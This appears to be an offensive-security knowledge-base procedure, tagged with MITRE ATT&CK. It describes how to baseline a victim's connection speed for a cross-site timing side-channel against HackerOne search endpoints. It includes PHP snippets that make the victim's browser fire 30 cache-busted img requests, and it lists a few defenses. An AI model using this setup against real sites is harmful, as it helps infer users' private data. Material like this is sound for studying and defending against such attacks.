---
id: proc-uuid-004
tags:
  - baseline-measurement
  - connection-speed
type: procedure
tools:
  - '[[tools/PHP]]'
  - '[[tools/Browser-Console]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/generate-programs-baseline-php]]'
  - '[[commands/generate-bugs-baseline-php]]'
  - '[[commands/calculate-load-times-js]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Automated Collection]]'
updated_at: '2025-12-14T17:27:50.100Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Automated Collection]]'
---
# Measure-Baseline-Load-Times

## Summary

This procedure measures the victim's network connection speed by loading multiple consistent-response endpoints, providing a reference for normalizing variable query timings in the side-channel attack.

## Description

Using PHP-generated HTML, create 30 parallel `<img>` requests to fixed endpoints (empty bugs ~750 bytes, programs search ~9200 bytes). JavaScript averages the timings to estimate bandwidth, accounting for latency and avoiding caching with random parameters.

## Requirements

1. Hosted PHP scripts (1.php, 2.php)
2. Browser console access post-load
3. Writable data directory for outputs

## Defense

Defensive measures and detection strategies:

- Cache responses aggressively for consistent endpoints
- Detect parallel burst requests from single IPs
- Use constant-time processing where possible

## Objectives

1. Calculate average load time per byte
2. Establish baselines for small and large fixed responses
3. Filter out network variability for accurate inference

## Instructions

### Step 1: Generate Programs Baseline

**Context**: Load fixed large response for high-byte timing.

**Command** ([[commands/generate-programs-baseline-php]]):
```php
<?php for ($i=0;$i<30;$i++){ echo '<img id=grr"'.$i.'" src="https://hackerone.com/programs/search.json?query=IBB&sort=published_at%3Adescending&page=1&rnd='.rand(1,5000).'"></img>'; } ?>
```

> Embed in 1.php; load page to trigger.

### Step 2: Generate Bugs Baseline

**Context**: Load empty response for low-byte timing.

**Command** ([[commands/generate-bugs-baseline-php]]):
```php
<?php for ($i=0;$i<30;$i++){ echo '<img id=grr"'.$i.'" src="https://hackerone.com/bugs.json?text_query=999999&subject=&sort_type=pg_search_rank&substates%5B%5D=triaged&rnd='.rand(1,5000).'">'; } ?>
```

> Embed in 2.php.

### Step 3: Calculate Averages

**Context**: Log and average timings.

**Command** ([[commands/calculate-load-times-js]]):
Run in console post-load.

> Outputs ms values; average for baselines.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Automated Collection]] Automated Collection

### Sub-Techniques


## Commands Used

- [[commands/generate-programs-baseline-php]]
- [[commands/generate-bugs-baseline-php]]
- [[commands/calculate-load-times-js]]

## Tools Used

- [[tools/PHP]]
- [[tools/Browser-Console]]

## Tags

- [[data-collection]]
- [[timing-baseline]]
